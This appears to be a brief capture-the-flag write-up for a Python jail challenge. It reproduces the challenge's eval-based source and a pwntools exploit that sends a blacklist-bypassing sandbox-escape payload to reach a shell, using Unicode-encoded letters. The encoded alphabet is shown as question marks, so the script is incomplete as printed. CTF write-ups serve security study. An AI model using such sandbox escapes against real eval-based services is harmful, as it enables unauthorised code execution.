## Owner:

> CaptainFreak

#### Solved?

 -No

#### Tried:

Bypassing blacklist.

#### Solutions:


Challenges had following code:

```python
#!/usr/bin/env python3.7

from rctf import golf
import string, os


# NOTE: Although this challenge may seem impossible, rest assured that we have 
# a working solution that would meet the length restriction within the first  
# few days of the CTF. Keep digging!


rate = 2 # bytes per hour
base = 30 # amount to start with
blacklist = string.ascii_letters + '"\' '


if __name__ == '__main__':
    # create banner
    n = golf.calculate_limit(
        'https://staging.redpwn.net/' if os.environ.get('DEBUG') else 'https://2020.redpwn.net/',
        'albatross', # challenge id
        1592769600, # CTF start date
        lambda hours : int(base + (hours * rate))
    )
    
    print(
        'Welcome to Albatross, the pyjail challenge you wish never existed.\n'
        f'* At the moment, you are only permitted to use a payload of {n} bytes or shorter.\n'
        f'* Every hour, the byte restriction will increase by {rate}.\n'
        '* Once the a team solves this challenge, the restriction will stop increasing\n'
        '* The flag is in /flag.txt\n'
        '* Don\'t let b1c get those HackerOne hoodies! Now\'s your chance to stop them with this high-point challenge.\n' # i literally made this challenge to disadvantage b1c btw
    )

    # filter payload
    try:
        payload = ''.join([
            (x if x not in blacklist else '')
            for x in
            input('>>> ')[:n]
        ])
    except (EOFError, KeyboardInterrupt):
        print('\nYou gave up. Understandable.')
        exit()

    # execute payload
    eval(str(payload), {'__builtins__' : None}, {})
```


Exploit:
```python
#!/usr/bin/env python3
from pwn import *

r = remote("2020.redpwnc.tf", 31156)

# CTFtime does not like special characters so please refer to the original writeup for the actual values.
alphabet_encoded = "????????????????????????????????????????????????????"
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
bold_translation = str.maketrans(alphabet, alphabet_encoded)

payload = "[*().__class__.__base__.__subclasses__()[127].__init__.__globals__.values()][42](().__doc__[19:57:37])"
payload = payload.translate(bold_translation)

r.sendlineafter(">>> ", payload)
r.interactive()
```

Reference: https://ctftime.org/writeup/21745







